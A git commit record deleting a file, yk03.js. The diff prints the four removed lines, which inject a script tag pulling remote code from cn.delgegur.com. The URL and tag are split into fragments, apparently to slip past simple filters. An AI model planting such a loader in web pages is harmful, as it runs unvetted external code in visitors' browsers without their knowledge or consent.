5cca90d7d9b02dad6512f541e669d5b0944ffae3
jisucdn <79298333+jisucdn@users.noreply.github.com>
2021-10-23 16:50:30 +0800

    Delete yk03.js

--- yk03.js
+++
@@ -1,4 +0,0 @@
-document.writeln('<script id="EX8NDYGmQ2JpXxHkQYLuUV" src="ht')
-document.writeln('tps:')
-document.writeln('//cn.delgegur.com/142/EX8NDYGmQ2JpXxHkQYLuUV.shtml?'+new Date().getTime()+'"')
-document.writeln('><\/scr' + 'ipt>')
